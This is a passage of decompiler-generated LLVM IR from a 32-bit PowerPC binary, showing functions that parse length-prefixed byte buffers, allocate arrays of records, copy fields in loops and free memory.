  %v2_10001f04 = load i32, i32* %v1_10001f04, align 4
  store i32 %v2_10001f04, i32* %r25.global-to-local, align 4
  br i1 %v3_10001f00, label %dec_label_pc_10001f0c, label %dec_label_pc_10001f54

dec_label_pc_10001f0c:                            ; preds = %dec_label_pc_10001f00, %dec_label_pc_10002100, %dec_label_pc_10001f6c, %dec_label_pc_10001f60, %dec_label_pc_10001f54, %dec_label_pc_10001eac, %dec_label_pc_10002134
  %v1_10001f20 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10001eac)
  store i32 %v0_10001edc, i32* @r24, align 4
  store i32 %v0_10001ee4, i32* @r26, align 4
  store i32 %v0_10001ee8, i32* @r27, align 4
  store i32 %v0_10001eec, i32* @r28, align 4
  %v0_10001f50 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10001f50

dec_label_pc_10001f54:                            ; preds = %dec_label_pc_10001f00
  %v3_10001f54 = icmp eq i32 %arg2, 5
  %v1_10001f58 = add i32 %v0_10001eac, 4
  %v2_10001f58 = inttoptr i32 %v1_10001f58 to i8*
  %v3_10001f58 = load i8, i8* %v2_10001f58, align 1
  %v4_10001f58 = zext i8 %v3_10001f58 to i32
  store i32 %v4_10001f58, i32* %r22.global-to-local, align 4
  br i1 %v3_10001f54, label %dec_label_pc_10001f0c, label %dec_label_pc_10001f60

dec_label_pc_10001f60:                            ; preds = %dec_label_pc_10001f54
  %v1_10001f60 = add i32 %v0_10001eac, 5
  %v2_10001f60 = inttoptr i32 %v1_10001f60 to i8*
  %v3_10001f60 = load i8, i8* %v2_10001f60, align 1
  %v4_10001f60 = zext i8 %v3_10001f60 to i32
  store i32 %v4_10001f60, i32* @r26, align 4
  %v3_10001f64 = icmp eq i8 %v3_10001f60, 0
  store i1 false, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10001f64, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10001f64, label %dec_label_pc_10001f0c, label %dec_label_pc_10001f6c

dec_label_pc_10001f6c:                            ; preds = %dec_label_pc_10001f60
  %v1_10001f6c = mul nuw nsw i32 %v4_10001f60, 5
  store i32 %v1_10001f6c, i32* @r27, align 4
  %v1_10001f70 = add i32 %arg2, -6
  store i32 %v1_10001f70, i32* @r28, align 4
  %v2_10001f74 = icmp ult i32 %v1_10001f70, %v1_10001f6c
  br i1 %v2_10001f74, label %dec_label_pc_10001f0c, label %dec_label_pc_10001f7c

dec_label_pc_10001f7c:                            ; preds = %dec_label_pc_10001f6c
  store i32 %v4_10001f60, i32* %r3.global-to-local, align 4
  store i32 268443528, i32* @lr, align 4
  %v2_10001f84 = call i32 @function_10008ec0(i32 %v4_10001f60, i32 24)
  store i32 %v2_10001f84, i32* %r3.global-to-local, align 4
  %v0_10001f88 = load i32, i32* @r31, align 4
  %v1_10001f88 = add i32 %v0_10001f88, 6
  store i32 %v1_10001f88, i32* @r29, align 4
  store i32 %v2_10001f84, i32* %r20.global-to-local, align 4
  %v0_10001f90 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10001f90 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10001f90 = or i1 %v0_10001f90, %v1_10001f90
  br i1 %v2_10001f90, label %dec_label_pc_10001fecthread-pre-split, label %dec_label_pc_10001f94

dec_label_pc_10001f94:                            ; preds = %dec_label_pc_10001f7c
  %v0_10001f94 = load i32, i32* @r27, align 4
  store i32 %v2_10001f84, i32* %r11.global-to-local, align 4
  %tmp29 = mul i32 %v0_10001f94, -858993459
  store i32 2, i32* %r10.global-to-local, align 4
  store i32 %tmp29, i32* %r9.global-to-local, align 4
  store i32 %tmp29, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10001fbc

dec_label_pc_10001fbc:                            ; preds = %dec_label_pc_10001fbc.dec_label_pc_10001fbc_crit_edge, %dec_label_pc_10001f94
  %v2_10001fc8 = phi i32 [ %v1_10001fd8, %dec_label_pc_10001fbc.dec_label_pc_10001fbc_crit_edge ], [ %v2_10001f84, %dec_label_pc_10001f94 ]
  %v0_10001fc4 = phi i32 [ %v0_10001fbc.pre, %dec_label_pc_10001fbc.dec_label_pc_10001fbc_crit_edge ], [ %v1_10001f88, %dec_label_pc_10001f94 ]
  %v1_10001fbc = add i32 %v0_10001fc4, 4
  %v2_10001fbc = inttoptr i32 %v1_10001fbc to i8*
  %v3_10001fbc = load i8, i8* %v2_10001fbc, align 1
  %v1_10001fc0 = inttoptr i32 %v0_10001fc4 to i32*
  %v2_10001fc0 = load i32, i32* %v1_10001fc0, align 4
  store i32 %v2_10001fc0, i32* %r9.global-to-local, align 4
  %v1_10001fc4 = add i32 %v0_10001fc4, 5
  store i32 %v1_10001fc4, i32* @r29, align 4
  %v3_10001fc8 = add i32 %v2_10001fc8, 20
  %v4_10001fc8 = inttoptr i32 %v3_10001fc8 to i8*
  store i8 %v3_10001fbc, i8* %v4_10001fc8, align 1
  %v0_10001fcc = load i32, i32* %r9.global-to-local, align 4
  %v1_10001fcc = load i32, i32* %r11.global-to-local, align 4
  %v2_10001fcc = add i32 %v1_10001fcc, 4
  %v3_10001fcc = inttoptr i32 %v2_10001fcc to i32*
  store i32 %v0_10001fcc, i32* %v3_10001fcc, align 4
  %v0_10001fd0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001fd0 = load i32, i32* %r11.global-to-local, align 4
  %v2_10001fd0 = add i32 %v1_10001fd0, 16
  %v3_10001fd0 = inttoptr i32 %v2_10001fd0 to i32*
  store i32 %v0_10001fd0, i32* %v3_10001fd0, align 4
  %v0_10001fd4 = load i32, i32* %r10.global-to-local, align 4
  %v1_10001fd4 = trunc i32 %v0_10001fd4 to i16
  %v2_10001fd4 = load i32, i32* %r11.global-to-local, align 4
  %v3_10001fd4 = inttoptr i32 %v2_10001fd4 to i16*
  store i16 %v1_10001fd4, i16* %v3_10001fd4, align 2
  %v0_10001fd8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10001fd8 = add i32 %v0_10001fd8, 24
  store i32 %v1_10001fd8, i32* %r11.global-to-local, align 4
  %v0_10001fdc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10001fdc = add i32 %v0_10001fdc, -1
  store i32 %v1_10001fdc, i32* %ctr.global-to-local, align 4
  %v2_10001fdc = icmp eq i32 %v1_10001fdc, 0
  br i1 %v2_10001fdc, label %dec_label_pc_10001fe0, label %dec_label_pc_10001fbc.dec_label_pc_10001fbc_crit_edge

dec_label_pc_10001fbc.dec_label_pc_10001fbc_crit_edge: ; preds = %dec_label_pc_10001fbc
  %v0_10001fbc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10001fbc

dec_label_pc_10001fe0:                            ; preds = %dec_label_pc_10001fbc
  %v0_10001fe0 = load i32, i32* @r26, align 4
  %v1_10001fe0 = mul i32 %v0_10001fe0, -5
  %v0_10001fe4 = load i32, i32* @r30, align 4
  %v2_10001fe4 = add i32 %v0_10001fe4, %v1_10001fe0
  store i32 %v2_10001fe4, i32* %r9.global-to-local, align 4
  %v1_10001fe8 = add i32 %v2_10001fe4, -6
  store i32 %v1_10001fe8, i32* @r28, align 4
  br label %dec_label_pc_10001fec

dec_label_pc_10001fecthread-pre-split:            ; preds = %dec_label_pc_10001f7c
  %v0_10001fec.pr = load i32, i32* @r28, align 4
  br label %dec_label_pc_10001fec

dec_label_pc_10001fec:                            ; preds = %dec_label_pc_10001fecthread-pre-split, %dec_label_pc_10001fe0
  %v0_10001fec = phi i32 [ %v0_10001fec.pr, %dec_label_pc_10001fecthread-pre-split ], [ %v1_10001fe8, %dec_label_pc_10001fe0 ]
  %v3_10001fec = icmp eq i32 %v0_10001fec, 0
  store i32 0, i32* %r21.global-to-local, align 4
  br i1 %v3_10001fec, label %dec_label_pc_100020f0, label %dec_label_pc_10001ff8

dec_label_pc_10001ff8:                            ; preds = %dec_label_pc_10001fec
  %v0_10001ff8 = load i32, i32* @r29, align 4
  %v1_10001ff8 = inttoptr i32 %v0_10001ff8 to i8*
  %v2_10001ff8 = load i8, i8* %v1_10001ff8, align 1
  %v3_10001ff8 = zext i8 %v2_10001ff8 to i32
  store i32 %v3_10001ff8, i32* @r24, align 4
  %v3_10001ffc = icmp eq i8 %v2_10001ff8, 0
  store i1 false, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10001ffc, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10001ffc, label %dec_label_pc_100020c8, label %dec_label_pc_10002004

dec_label_pc_10002004:                            ; preds = %dec_label_pc_10001ff8
  store i32 %v3_10001ff8, i32* %r3.global-to-local, align 4
  store i32 268443664, i32* @lr, align 4
  %v2_1000200c = call i32 @function_10008ec0(i32 %v3_10001ff8, i32 8)
  store i32 %v2_1000200c, i32* %r3.global-to-local, align 4
  store i32 %v2_1000200c, i32* %r21.global-to-local, align 4
  %v0_10002014 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10002014 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10002014 = or i1 %v0_10002014, %v1_10002014
  br i1 %v2_10002014, label %dec_label_pc_100020c8, label %dec_label_pc_10002018

dec_label_pc_10002018:                            ; preds = %dec_label_pc_10002004
  %v0_10002018 = load i32, i32* @r28, align 4
  %v1_10002018 = add i32 %v0_10002018, -1
  %v4_10002018 = icmp eq i32 %v1_10002018, 0
  store i32 %v1_10002018, i32* %ctr.global-to-local, align 4
  br i1 %v4_10002018, label %dec_label_pc_100020f0, label %dec_label_pc_10002024

dec_label_pc_10002024:                            ; preds = %dec_label_pc_10002018
  %v0_10002024 = load i32, i32* @r29, align 4
  %v1_10002024 = add i32 %v0_10002024, 1
  %v2_10002024 = inttoptr i32 %v1_10002024 to i8*
  %v3_10002024 = load i8, i8* %v2_10002024, align 1
  store i32 %v1_10002024, i32* %r9.global-to-local, align 4
  %v3_1000202c = add i32 %v2_1000200c, 4
  %v4_1000202c = inttoptr i32 %v3_1000202c to i8*
  store i8 %v3_10002024, i8* %v4_1000202c, align 1
  %v0_10002030 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10002030 = add i32 %v0_10002030, -1
  store i32 %v1_10002030, i32* %ctr.global-to-local, align 4
  %v2_10002030 = icmp eq i32 %v1_10002030, 0
  br i1 %v2_10002030, label %dec_label_pc_100020f0, label %dec_label_pc_10002034

dec_label_pc_10002034:                            ; preds = %dec_label_pc_10002024
  store i32 %v1_10002030, i32* %r11.global-to-local, align 4
  %v0_10002038 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002038 = add i32 %v0_10002038, 1
  %v2_10002038 = inttoptr i32 %v1_10002038 to i8*
  %v3_10002038 = load i8, i8* %v2_10002038, align 1
  %v4_10002038 = zext i8 %v3_10002038 to i32
  %v1_10002040 = add i32 %v0_10002030, -2
  store i32 %v1_10002040, i32* @r29, align 4
  %v2_10002044 = icmp slt i32 %v1_10002040, %v4_10002038
  br i1 %v2_10002044, label %dec_label_pc_100020f0, label %dec_label_pc_1000204c

dec_label_pc_1000204c:                            ; preds = %dec_label_pc_10002034
  %v1_1000204c = add i32 %v0_10002038, 2
  store i32 %v1_1000204c, i32* @r28, align 4
  %v0_10002050 = load i32, i32* %r3.global-to-local, align 4
  %v1_10002050 = add i32 %v0_10002050, 8
  store i32 %v1_10002050, i32* %r23.global-to-local, align 4
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10002094

dec_label_pc_10002060:                            ; preds = %dec_label_pc_10002094
  %v5_100020bc = icmp eq i32 %v2_100020bc, 0
  br i1 %v5_100020bc, label %dec_label_pc_100020f0, label %dec_label_pc_10002064

dec_label_pc_10002064:                            ; preds = %dec_label_pc_10002060
  %v1_10002064 = load i32, i32* @r28, align 4
  %v2_10002064 = add i32 %v1_10002064, %v0_100020bc
  %v3_10002064 = inttoptr i32 %v2_10002064 to i8*
  %v4_10002064 = load i8, i8* %v3_10002064, align 1
  store i32 %v2_10002064, i32* %r3.global-to-local, align 4
  %v1_1000206c = add i32 %v2_10002064, 1
  store i32 %v1_1000206c, i32* %r9.global-to-local, align 4
  %v2_10002070 = load i32, i32* @r30, align 4
  %v3_10002070 = add i32 %v2_10002070, 4
  %v4_10002070 = inttoptr i32 %v3_10002070 to i8*
  store i8 %v4_10002064, i8* %v4_10002070, align 1
  %v0_10002074 = load i32, i32* %r11.global-to-local, align 4
  %v1_10002074 = add i32 %v0_10002074, -1
  %v4_10002074 = icmp eq i32 %v1_10002074, 0
  %v0_10002078 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002078 = add i32 %v0_10002078, 1
  store i32 %v1_10002078, i32* @r28, align 4
  br i1 %v4_10002074, label %dec_label_pc_100020f0, label %dec_label_pc_10002080

dec_label_pc_10002080:                            ; preds = %dec_label_pc_10002064
  %v0_10002080 = load i32, i32* %r3.global-to-local, align 4
  %v1_10002080 = add i32 %v0_10002080, 1
  %v2_10002080 = inttoptr i32 %v1_10002080 to i8*
  %v3_10002080 = load i8, i8* %v2_10002080, align 1
  %v4_10002080 = zext i8 %v3_10002080 to i32
  store i32 %v1_10002074, i32* %r9.global-to-local, align 4
  %v1_10002088 = add i32 %v0_10002074, -2
  store i32 %v1_10002088, i32* @r29, align 4
  %v2_1000208c = icmp slt i32 %v1_10002088, %v4_10002080
  br i1 %v2_1000208c, label %dec_label_pc_100020f0, label %dec_label_pc_10002094

dec_label_pc_10002094:                            ; preds = %dec_label_pc_10002080, %dec_label_pc_1000204c
  %v0_10002098 = phi i32 [ %v4_10002080, %dec_label_pc_10002080 ], [ %v4_10002038, %dec_label_pc_1000204c ]
  %v1_10002098 = add nuw nsw i32 %v0_10002098, 1
  store i32 %v1_10002098, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100020a0.60 to i32), i32* @lr, align 4
  %v2_1000209c = call i32 @function_10008ec0(i32 %v1_10002098, i32 1)
  store i32 %v2_1000209c, i32* %r3.global-to-local, align 4
  %v0_100020a0 = load i32, i32* @r27, align 4
  %v1_100020a0 = add i32 %v0_100020a0, 1
  store i32 %v1_100020a0, i32* @r27, align 4
  %v1_100020a4 = load i32, i32* @r30, align 4
  %v2_100020a4 = inttoptr i32 %v1_100020a4 to i32*
  store i32 %v2_1000209c, i32* %v2_100020a4, align 4
  %v0_100020a8 = load i32, i32* @r28, align 4
  %v0_100020ac = load i32, i32* @r31, align 4
  %v0_100020b0 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_100020b0, i32* @r30, align 4
  store i32 268443832, i32* @lr, align 4
  %v3_100020b4 = call i32 @function_10007560(i32 %v2_1000209c, i32 %v0_100020a8, i32 %v0_100020ac)
  store i32 %v3_100020b4, i32* %r3.global-to-local, align 4
  %v0_100020b8 = load i32, i32* @r27, align 4
  %v1_100020b8 = load i32, i32* @r24, align 4
  %v4_100020b8 = icmp eq i32 %v0_100020b8, %v1_100020b8
  %v0_100020bc = load i32, i32* @r31, align 4
  %v1_100020bc = load i32, i32* @r29, align 4
  %v2_100020bc = sub i32 %v1_100020bc, %v0_100020bc
  store i32 %v2_100020bc, i32* %r11.global-to-local, align 4
  %v0_100020c0 = load i32, i32* %r23.global-to-local, align 4
  %v1_100020c0 = add i32 %v0_100020c0, 8
  store i32 %v1_100020c0, i32* %r23.global-to-local, align 4
  br i1 %v4_100020b8, label %dec_label_pc_100020c8, label %dec_label_pc_10002060

dec_label_pc_100020c8:                            ; preds = %dec_label_pc_10002094, %dec_label_pc_10002004, %dec_label_pc_10001ff8
  %v0_100020c8 = call i32 @function_10008484()
  %v2_100020d0 = inttoptr i32 %v0_100020c8 to i32*
  store i32 0, i32* %v2_100020d0, align 4
  %v0_100020d4 = load i32, i32* %r22.global-to-local, align 4
  %v0_100020d8 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100020d8, i32* %r3.global-to-local, align 4
  %v0_100020dc = load i32, i32* @r26, align 4
  %v0_100020e0 = load i32, i32* %r20.global-to-local, align 4
  %v0_100020e4 = load i32, i32* @r24, align 4
  %v0_100020e8 = load i32, i32* %r21.global-to-local, align 4
  store i32 268443888, i32* @lr, align 4
  %v6_100020ec = call i32 @function_10001d98(i32 %v0_100020d8, i32 %v0_100020d4, i32 %v0_100020dc, i32 %v0_100020e0, i32 %v0_100020e4, i32 %v0_100020e8)
  store i32 %v6_100020ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100020f0

dec_label_pc_100020f0:                            ; preds = %dec_label_pc_10002080, %dec_label_pc_10002064, %dec_label_pc_10002060, %dec_label_pc_10002034, %dec_label_pc_10002024, %dec_label_pc_10002018, %dec_label_pc_10001fec, %dec_label_pc_100020c8
  %v0_100020f0 = load i32, i32* %r20.global-to-local, align 4
  %v3_100020f0 = icmp eq i32 %v0_100020f0, 0
  br i1 %v3_100020f0, label %dec_label_pc_10002100, label %dec_label_pc_100020f8

dec_label_pc_100020f8:                            ; preds = %dec_label_pc_100020f0
  store i32 %v0_100020f0, i32* @r3, align 4
  store i32 268443904, i32* @lr, align 4
  %v0_100020fc = call i32 @function_10008f30()
  store i32 %v0_100020fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002100

dec_label_pc_10002100:                            ; preds = %dec_label_pc_100020f0, %dec_label_pc_100020f8
  %v0_10002100 = load i32, i32* %r21.global-to-local, align 4
  %v3_10002100 = icmp eq i32 %v0_10002100, 0
  br i1 %v3_10002100, label %dec_label_pc_10001f0c, label %dec_label_pc_10002108

dec_label_pc_10002108:                            ; preds = %dec_label_pc_10002100
  %v0_10002108 = load i32, i32* @r24, align 4
  %tmp27 = icmp slt i32 %v0_10002108, 1
  br i1 %tmp27, label %dec_label_pc_10002134, label %dec_label_pc_10002110

dec_label_pc_10002110:                            ; preds = %dec_label_pc_10002108
  br label %dec_label_pc_10002114

dec_label_pc_10002114:                            ; preds = %dec_label_pc_1000212c, %dec_label_pc_10002110
  %v0_1000212c6 = phi i32 [ %v0_10002108, %dec_label_pc_10002110 ], [ %v0_1000212c, %dec_label_pc_1000212c ]
  %v0_1000211c = phi i32 [ %v0_10002100, %dec_label_pc_10002110 ], [ %v0_10002134.pre, %dec_label_pc_1000212c ]
  %v0_10002114 = phi i32 [ 0, %dec_label_pc_10002110 ], [ %v1_1000212c, %dec_label_pc_1000212c ]
  %v1_10002114 = mul i32 %v0_10002114, 8
  %v1_10002118 = add i32 %v0_10002114, 1
  store i32 %v1_10002118, i32* @r31, align 4
  %v2_1000211c = add i32 %v1_10002114, %v0_1000211c
  %v3_1000211c = inttoptr i32 %v2_1000211c to i32*
  %v4_1000211c = load i32, i32* %v3_1000211c, align 4
  store i32 %v4_1000211c, i32* @r3, align 4
  %v3_10002120 = icmp eq i32 %v4_1000211c, 0
  br i1 %v3_10002120, label %dec_label_pc_1000212c, label %dec_label_pc_10002128

dec_label_pc_10002128:                            ; preds = %dec_label_pc_10002114
  store i32 268443948, i32* @lr, align 4
  %v0_10002128 = call i32 @function_10008f30()
  store i32 %v0_10002128, i32* %r3.global-to-local, align 4
  %v0_1000212c.pre = load i32, i32* @r24, align 4
  %v1_1000212c.pre = load i32, i32* @r31, align 4
  %v0_10002134.pre.pre = load i32, i32* %r21.global-to-local, align 4
  br label %dec_label_pc_1000212c

dec_label_pc_1000212c:                            ; preds = %dec_label_pc_10002114, %dec_label_pc_10002128
  %v0_10002134.pre = phi i32 [ %v0_1000211c, %dec_label_pc_10002114 ], [ %v0_10002134.pre.pre, %dec_label_pc_10002128 ]
  %v1_1000212c = phi i32 [ %v1_10002118, %dec_label_pc_10002114 ], [ %v1_1000212c.pre, %dec_label_pc_10002128 ]
  %v0_1000212c = phi i32 [ %v0_1000212c6, %dec_label_pc_10002114 ], [ %v0_1000212c.pre, %dec_label_pc_10002128 ]
  %v4_1000212c = icmp eq i32 %v0_1000212c, %v1_1000212c
  br i1 %v4_1000212c, label %dec_label_pc_10002134, label %dec_label_pc_10002114

dec_label_pc_10002134:                            ; preds = %dec_label_pc_1000212c, %dec_label_pc_10002108
  %v0_10002134 = phi i32 [ %v0_10002100, %dec_label_pc_10002108 ], [ %v0_10002134.pre, %dec_label_pc_1000212c ]
  store i32 %v0_10002134, i32* @r3, align 4
  store i32 268443964, i32* @lr, align 4
  %v0_10002138 = call i32 @function_10008f30()
  store i32 %v0_10002138, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001f0c

; uselistorder directives
  uselistorder i32 %v0_1000212c, { 1, 0 }
  uselistorder i32 %v1_1000212c, { 1, 0 }
  uselistorder i32 %v0_10002114, { 1, 0 }
  uselistorder i32 %v2_100020bc, { 1, 0 }
  uselistorder i32 %v0_100020bc, { 1, 0 }
  uselistorder i32 %v2_10002064, { 1, 0, 2 }
  uselistorder i32 %v1_10002030, { 0, 2, 1 }
  uselistorder i32 %v3_10001ff8, { 1, 0, 2 }
  uselistorder i32 %v1_10001fdc, { 1, 0 }
  uselistorder i32 %v1_10001fd8, { 1, 0 }
  uselistorder i32 %v0_10001fc4, { 0, 2, 1 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %v4_10001f60, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10001eac, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 9, 10, 11, 7, 8, 12, 13, 14, 16, 17, 15, 1, 0 }
  uselistorder i32* %r21.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r20.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg2, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000212c, { 1, 0 }
  uselistorder label %dec_label_pc_10002100, { 1, 0 }
  uselistorder label %dec_label_pc_100020f0, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10001f0c, { 6, 1, 2, 3, 4, 0, 5 }
}

define i32 @function_10002140(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10002140:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %tmp7 = icmp slt i32 %arg1, 1
  br i1 %tmp7, label %dec_label_pc_10002184, label %dec_label_pc_10002158

dec_label_pc_10002158:                            ; preds = %dec_label_pc_10002140
  %v0_10002158 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002158 = add i32 %v0_10002158, 4
  %v2_10002158 = inttoptr i32 %v1_10002158 to i8*
  %v3_10002158 = load i8, i8* %v2_10002158, align 1
  %v4_10002158 = zext i8 %v3_10002158 to i32
  %v4_10002160 = icmp eq i32 %v4_10002158, %arg3
  br i1 %v4_10002160, label %dec_label_pc_10002198, label %dec_label_pc_1000217c

dec_label_pc_1000216c:                            ; preds = %dec_label_pc_1000217c
  %v1_1000216c = add i32 %v0_1000216c.in, 12
  %v2_1000216c = inttoptr i32 %v1_1000216c to i8*
  %v3_1000216c = load i8, i8* %v2_1000216c, align 1
  %v4_1000216c = zext i8 %v3_1000216c to i32
  %v4_10002174 = icmp eq i32 %v4_1000216c, %arg3
  br i1 %v4_10002174, label %dec_label_pc_10002198, label %dec_label_pc_1000217c

dec_label_pc_1000217c:                            ; preds = %dec_label_pc_10002158, %dec_label_pc_1000216c
  %v0_10002180 = phi i32 [ %v1_10002180, %dec_label_pc_1000216c ], [ %arg1, %dec_label_pc_10002158 ]
  %v0_1000216c.in = phi i32 [ %v0_1000216c, %dec_label_pc_1000216c ], [ %v0_10002158, %dec_label_pc_10002158 ]
  %v0_1000216c = add i32 %v0_1000216c.in, 8
  store i32 %v0_1000216c, i32* %r4.global-to-local, align 4
  %v1_10002180 = add i32 %v0_10002180, -1
  %v2_10002180 = icmp eq i32 %v1_10002180, 0
  br i1 %v2_10002180, label %dec_label_pc_10002184, label %dec_label_pc_1000216c

dec_label_pc_10002184:                            ; preds = %dec_label_pc_1000217c, %dec_label_pc_10002198, %dec_label_pc_10002140
  ret i32 %arg4

dec_label_pc_10002198:                            ; preds = %dec_label_pc_1000216c, %dec_label_pc_10002158
  %v0_10002198 = phi i32 [ %v0_10002158, %dec_label_pc_10002158 ], [ %v0_1000216c, %dec_label_pc_1000216c ]
  %v1_10002198 = inttoptr i32 %v0_10002198 to i32*
  %v2_10002198 = load i32, i32* %v1_10002198, align 4
  %v3_1000219c = icmp eq i32 %v2_10002198, 0
  br i1 %v3_1000219c, label %dec_label_pc_10002184, label %dec_label_pc_100021a4

dec_label_pc_100021a4:                            ; preds = %dec_label_pc_10002198
  store i32 268444072, i32* @lr, align 4
  %v1_100021a4 = call i32 @function_10008898(i32 %v2_10002198)
  ret i32 %v1_100021a4

; uselistorder directives
  uselistorder i32 %v1_10002180, { 1, 0 }
  uselistorder i32 %v0_1000216c, { 1, 0, 2 }
  uselistorder i32 %v0_1000216c.in, { 1, 0 }
  uselistorder i32 %v0_10002158, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10002184, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000217c, { 1, 0 }
}

define i32 @function_100021c0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100021c0:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %tmp7 = icmp slt i32 %arg1, 1
  br i1 %tmp7, label %dec_label_pc_10002204, label %dec_label_pc_100021d8

dec_label_pc_100021d8:                            ; preds = %dec_label_pc_100021c0
  %v0_100021d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_100021d8 = add i32 %v0_100021d8, 4
  %v2_100021d8 = inttoptr i32 %v1_100021d8 to i8*
  %v3_100021d8 = load i8, i8* %v2_100021d8, align 1
  %v4_100021d8 = zext i8 %v3_100021d8 to i32
  %v4_100021e0 = icmp eq i32 %v4_100021d8, %arg3
  br i1 %v4_100021e0, label %dec_label_pc_10002218, label %dec_label_pc_100021fc

dec_label_pc_100021ec:                            ; preds = %dec_label_pc_100021fc
  %v1_100021ec = add i32 %v0_100021ec.in, 12
  %v2_100021ec = inttoptr i32 %v1_100021ec to i8*
  %v3_100021ec = load i8, i8* %v2_100021ec, align 1
  %v4_100021ec = zext i8 %v3_100021ec to i32
  %v4_100021f4 = icmp eq i32 %v4_100021ec, %arg3
  br i1 %v4_100021f4, label %dec_label_pc_10002218, label %dec_label_pc_100021fc

dec_label_pc_100021fc:                            ; preds = %dec_label_pc_100021d8, %dec_label_pc_100021ec
  %v0_10002200 = phi i32 [ %v1_10002200, %dec_label_pc_100021ec ], [ %arg1, %dec_label_pc_100021d8 ]
  %v0_100021ec.in = phi i32 [ %v0_100021ec, %dec_label_pc_100021ec ], [ %v0_100021d8, %dec_label_pc_100021d8 ]
  %v0_100021ec = add i32 %v0_100021ec.in, 8
  store i32 %v0_100021ec, i32* %r4.global-to-local, align 4
  %v1_10002200 = add i32 %v0_10002200, -1
  %v2_10002200 = icmp eq i32 %v1_10002200, 0
  br i1 %v2_10002200, label %dec_label_pc_10002204, label %dec_label_pc_100021ec

dec_label_pc_10002204:                            ; preds = %dec_label_pc_100021fc, %dec_label_pc_10002218, %dec_label_pc_100021c0
  ret i32 %arg4

dec_label_pc_10002218:                            ; preds = %dec_label_pc_100021ec, %dec_label_pc_100021d8
  %v0_10002218 = phi i32 [ %v0_100021d8, %dec_label_pc_100021d8 ], [ %v0_100021ec, %dec_label_pc_100021ec ]
  %v1_10002218 = inttoptr i32 %v0_10002218 to i32*
  %v2_10002218 = load i32, i32* %v1_10002218, align 4
  store i32 %v2_10002218, i32* @r3, align 4
  %v3_1000221c = icmp eq i32 %v2_10002218, 0
  br i1 %v3_1000221c, label %dec_label_pc_10002204, label %dec_label_pc_10002224

dec_label_pc_10002224:                            ; preds = %dec_label_pc_10002218
  store i32 10, i32* %r4.global-to-local, align 4
  store i32 268444204, i32* @lr, align 4
  %v2_10002228 = call i32 @function_10007604(i32 %v2_10002218, i32 10)
  ret i32 %v2_10002228

; uselistorder directives
  uselistorder i32 %v1_10002200, { 1, 0 }
  uselistorder i32 %v0_100021ec, { 1, 0, 2 }
  uselistorder i32 %v0_100021ec.in, { 1, 0 }
  uselistorder i32 %v0_100021d8, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10002204, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100021fc, { 1, 0 }
}

define i32 @function_10002244(i32 %arg1) local_unnamed_addr {
dec_label_pc_10002244:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v0_10002248 = load i32, i32* @lr, align 4
  store i32 %v0_10002248, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v0_10002264 = load i32, i32* @r28, align 4
  store i32 268444272, i32* @lr, align 4
  %v2_1000226c = call i32 @function_10008ec0(i32 1, i32 8)
  %v3_10002270 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_10002270 = zext i8 %v3_10002270 to i32
  store i32 %v4_10002270, i32* %r4.global-to-local, align 4
  store i32 %v2_1000226c, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_10002284 = load i32, i32* @global_var_1001b290.59, align 4
  %v2_10002288 = inttoptr i32 %v2_1000226c to i32*
  store i32 268453180, i32* %v2_10002288, align 4
  %v0_1000228c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000228c = mul i32 %v0_1000228c, 4
  store i32 %v1_1000228c, i32* %r4.global-to-local, align 4
